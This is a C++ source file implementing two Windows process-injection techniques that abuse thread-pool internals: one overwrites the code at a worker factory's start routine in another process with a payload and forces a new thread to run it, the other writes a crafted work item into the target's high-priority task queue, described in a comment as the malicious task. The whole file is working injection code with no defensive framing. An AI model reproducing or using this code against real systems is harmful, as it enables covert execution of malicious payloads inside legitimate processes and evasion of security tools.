#include "injection.hpp"

//
// Note: The worker factory's start routine cannot be overwritten as it is constant.
// We can, however, write the payload at the location that the start routine points to.
//

bool InjectViaWorkerFactoryStartRoutine(_In_ HANDLE targetProcess, _In_ HANDLE hWorkerFactory, _In_ void* localPayloadAddress, _In_ size_t payloadSize) {

	NTSTATUS status = ERROR_SUCCESS;				WORKER_FACTORY_BASIC_INFORMATION workerFactoryInfo = { 0 };
	uint32_t oldProtect = 0;						uint32_t threadMinimumCount = 0;
	
	fnNtSetInformationWorkerFactory pNtSetInformationWorkerFactory = nullptr;		
	fnNtQueryInformationWorkerFactory pNtQueryInformationWorkerFactory = nullptr;


	//
	// Get function ptrs
	//

	pNtQueryInformationWorkerFactory = reinterpret_cast<fnNtQueryInformationWorkerFactory>(
		GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"),
			"NtQueryInformationWorkerFactory")
		);

	pNtSetInformationWorkerFactory = reinterpret_cast<fnNtSetInformationWorkerFactory>(
		GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"),
			"NtSetInformationWorkerFactory")
		);

	if (pNtSetInformationWorkerFactory == nullptr || pNtQueryInformationWorkerFactory == nullptr) {
		std::cerr << "{!!} Failed to get function pointers" << std::endl;
		return false;
	}



	//
	// Get Start Routine of the worker factory
	//

	status = pNtQueryInformationWorkerFactory(
		hWorkerFactory,
		WorkerFactoryBasicInformation,
		&workerFactoryInfo,
		sizeof(WORKER_FACTORY_BASIC_INFORMATION),
		nullptr);

	if (status != ERROR_SUCCESS) {
		NTAPI_ERR(NtQueryInformationWorkerFactory, status);
		return false;
	}



	//
	// Change start routine to R/W and copy payload
	//

	if (!VirtualProtectEx(
		targetProcess,
		workerFactoryInfo.StartRoutine,
		payloadSize,
		PAGE_READWRITE,
		(PDWORD)&oldProtect)) {

		WIN32_ERR(VirtualProtectEx ( First Call ));
		return false;
	}

	if (!WriteProcessMemory(
		targetProcess,
		workerFactoryInfo.StartRoutine,
		localPayloadAddress,
		payloadSize,
		nullptr )) {

		WIN32_ERR(WriteProcessMemory);
		return false;
	}

	if (!VirtualProtectEx( //< Revert protections
		targetProcess,
		workerFactoryInfo.StartRoutine,
		payloadSize,
		oldProtect,
		(PDWORD)&oldProtect )) {
	
		WIN32_ERR(VirtualProtectEx ( Second Call ));
		return false;
	}

	

	//
	// Increase minimum number of threads in the pool
	//

	threadMinimumCount = workerFactoryInfo.TotalWorkerCount + 1;
	
	status = pNtSetInformationWorkerFactory(
		hWorkerFactory,
		WorkerFactoryThreadMinimum,
		&threadMinimumCount,
		sizeof(uint32_t));

	if (status != ERROR_SUCCESS) {
		NTAPI_ERR(NtSetInformationWorkerFactory, status);
		return false;
	}


	return true;
}




//
// Injecting a work item directly into the task queue will not cause it to be
// executed right away, even at a high priority level. Once a check is done however for available tasks,
// the payload will run. From my experience this takes around 25-30 seconds.
//

bool InjectViaTpWork(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hWorkerFactory) {

	PFULL_TP_POOL pFullTpPoolBuffer = nullptr;			fnNtQueryInformationWorkerFactory pNtQueryInformationWorkerFactory = nullptr;
	size_t bytesRead = 0;								WORKER_FACTORY_BASIC_INFORMATION workerFactoryInfo = { 0 };
	LIST_ENTRY* taskQueueHighPriorityList = nullptr;	PFULL_TP_WORK pFullTpWork = nullptr;
	PFULL_TP_WORK pRemoteFullTpWork = nullptr;			LIST_ENTRY* pRemoteWorkItemTaskNode = nullptr;
	

	NTSTATUS status = 0x00;
	bool state = true;


	pNtQueryInformationWorkerFactory = reinterpret_cast<fnNtQueryInformationWorkerFactory>(
		GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"),
			"NtQueryInformationWorkerFactory")
		);


	if (pNtQueryInformationWorkerFactory == nullptr) {
		std::cerr << "{!!} Failed to get NtQueryInformationWorkerFactory function pointer." << std::endl;
		return false;
	}





	//
	// Create FULL_TP_WORK callback structure
	//

	pFullTpWork = reinterpret_cast<PFULL_TP_WORK>(CreateThreadpoolWork(
		static_cast<PTP_WORK_CALLBACK>(payloadAddress),
		nullptr,
		nullptr));

	if (pFullTpWork == nullptr) {
		WIN32_ERR(CreateThreadPoolWork);
		return false;
	}



	//
	// Query worker factory for StartRoutine value (head of linked list work queue)
	//

	status = pNtQueryInformationWorkerFactory(
		hWorkerFactory,
		WorkerFactoryBasicInformation,
		&workerFactoryInfo,
		sizeof(WORKER_FACTORY_BASIC_INFORMATION),
		nullptr
	);

	if (status != ERROR_SUCCESS) {
		
		NTAPI_ERR(NtQueryInformationWorkerFactory, status);
		state = false;
		goto FUNC_CLEANUP;
	}



	//
	// Allocate Heap Buffer for TP_POOL structure and copy it
	//

	pFullTpPoolBuffer = static_cast<PFULL_TP_POOL>(HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(FULL_TP_POOL)));

	if (pFullTpPoolBuffer == nullptr) {
		
		WIN32_ERR(HeapAlloc);
		state = false;
		goto FUNC_CLEANUP;
	}


	if (!ReadProcessMemory(
		targetProcess,
		workerFactoryInfo.StartParameter,
		pFullTpPoolBuffer,
		sizeof(FULL_TP_POOL),
		&bytesRead)) {

		WIN32_ERR(ReadProcessMemory);
		state = false;
		goto FUNC_CLEANUP;
	}



	//
	// Associate the callback with the process' TP_POOL
	//

	taskQueueHighPriorityList = &pFullTpPoolBuffer->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;

	pFullTpWork->CleanupGroupMember.Pool = static_cast<PFULL_TP_POOL>(workerFactoryInfo.StartParameter);
	pFullTpWork->Task.ListEntry.Flink = taskQueueHighPriorityList;
	pFullTpWork->Task.ListEntry.Blink = taskQueueHighPriorityList;
	pFullTpWork->WorkState.Exchange = 0x2;



	//
	// Write the callback structure into the process
	//

	pRemoteFullTpWork = static_cast<PFULL_TP_WORK>(VirtualAllocEx(
		targetProcess,
		nullptr,
		sizeof(FULL_TP_WORK),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	));

	if (pRemoteFullTpWork == nullptr) {
		
		WIN32_ERR(VirtualAllocEx);
		state = false;
		goto FUNC_CLEANUP;
	}


	if (!WriteProcessMemory(
		targetProcess,
		pRemoteFullTpWork,
		pFullTpWork,
		sizeof(FULL_TP_WORK),
		nullptr )) {

		WIN32_ERR(WriteProcessMemory ( First Call ));
		state = false;
		goto FUNC_CLEANUP;
	}



	//
	// Modify the TP_POOL linked list Flinks and Blinks to point to the malicious task
	//

	pRemoteWorkItemTaskNode = &pRemoteFullTpWork->Task.ListEntry;

	if (!WriteProcessMemory(
		targetProcess,
		&pFullTpPoolBuffer->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink,
		&pRemoteWorkItemTaskNode,
		sizeof(pRemoteWorkItemTaskNode),
		nullptr )) {

		WIN32_ERR(WriteProcessMemory ( Second Call ) );
		state = false;
		goto FUNC_CLEANUP;
	}

	if (!WriteProcessMemory(
		targetProcess,
		&pFullTpPoolBuffer->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink,
		&pRemoteWorkItemTaskNode,
		sizeof(pRemoteWorkItemTaskNode),
		nullptr )) {

		WIN32_ERR(WriteProcessMemory(Third Call));
		state = false;
	}



	FUNC_CLEANUP:

	if (pFullTpPoolBuffer) {
		HeapFree(GetProcessHeap(), 0, pFullTpPoolBuffer);
	}

	return state;
}